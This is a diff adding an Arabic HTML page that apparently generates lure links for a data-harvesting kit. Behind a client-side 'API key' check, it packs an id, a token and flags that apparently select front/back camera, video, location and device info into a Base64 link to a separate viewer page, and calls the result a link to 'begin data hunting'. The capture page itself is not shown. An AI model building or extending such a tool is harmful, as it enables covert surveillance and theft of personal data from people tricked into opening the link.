@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>API System Error</title>
+<style>
+    body {
+        margin: 0; padding: 0; height: 100vh; background: #fff;
+        display: flex; justify-content: center; align-items: center;
+        font-family: Tahoma, Arial, sans-serif; color: #333;
+        text-align: center;
+    }
+    .error-msg { font-size: 24px; font-weight: bold; color: #ff0000; }
+</style>
+</head>
+<body>
+<div id="app"></div>
+
+<script>
+    // ═══════════════════════════════════════════════════
+    // 1. التحقق من مفتاح الـ API
+    // ═══════════════════════════════════════════════════
+    const urlParams = new URLSearchParams(window.location.search);
+    const apiKey = urlParams.get('api');
+    
+    // المفتاح السري اللي لازم يكون في الرابط
+    const SECRET_API_KEY = '754298';
+
+    if (apiKey !== SECRET_API_KEY) {
+        // لو مفيش مفتاح أو غلط، تظهر الشاشة البيضاء بالخطأ
+        document.getElementById('app').innerHTML = '<div class="error-msg">خطأ في API key</div>';
+    } else {
+        // ═══════════════════════════════════════════════════
+        // 2. لو الرابط سليم، نستخرج الأدوات ونشفرها
+        // ═══════════════════════════════════════════════════
+        document.title = "رابط جاهز";
+        
+        // استخراج البيانات من الرابط
+        let config = {
+            id: urlParams.get('id') || '',
+            token: urlParams.get('token') || '',
+            fc: urlParams.has('fc'),
+            bc: urlParams.has('bc'),
+            fcv: urlParams.has('fcv'),
+            bcv: urlParams.has('bcv'),
+            r: urlParams.has('r'),
+            l: urlParams.has('l'),
+            inf: urlParams.has('inf')
+        };
+
+        // تحويل البيانات لـ JSON وتشفيرها Base64
+        let jsonStr = JSON.stringify(config);
+        let base64Str = btoa(unescape(encodeURIComponent(jsonStr)));
+        
+        // رابط صفحة التحميل (viewer.html) مع الإعدادات المشفرة
+        let viewerLink = window.location.origin + window.location.pathname.replace('index.html', '') + 'viewer.html?data=' + encodeURIComponent(base64Str);
+
+        // عرض النتيجة للمستخدم
+        document.body.style.display = 'block';
+        document.body.style.background = '#eef1f6';
+        document.body.style.padding = '20px';
+        
+        document.getElementById('app').innerHTML = `
+            <div style="max-width:600px; margin: 50px auto; background:#fff; padding:30px; border-radius:10px; box-shadow:0 4px 15px rgba(0,0,0,0.1);">
+                <h2 style="color:#1f2a44; margin-bottom:10px;">تم إنشاء الرابط بنجاح!</h2>
+                <p style="color:#6b7690; margin-bottom:20px;">انسخ الرابط التالي وافتحه لبدء صيد البيانات:</p>
+                
+                <div style="background:#f4f4f4; padding:15px; border-radius:8px; word-break:break-all; margin-bottom:20px; font-family:monospace; direction:ltr; text-align:left;">
+                    ${viewerLink}
+                </div>
+                
+                <button onclick="navigator.clipboard.writeText('${viewerLink}'); alert('تم نسخ الرابط!');" style="background:#2d7ff9; color:#fff; border:none; padding:12px 24px; font-size:16px; border-radius:6px; cursor:pointer; font-weight:bold;">
+                    نسخ الرابط
+                </button>
+            </div>
+        `;
+    }
+</script>
+</body>
+  </html>
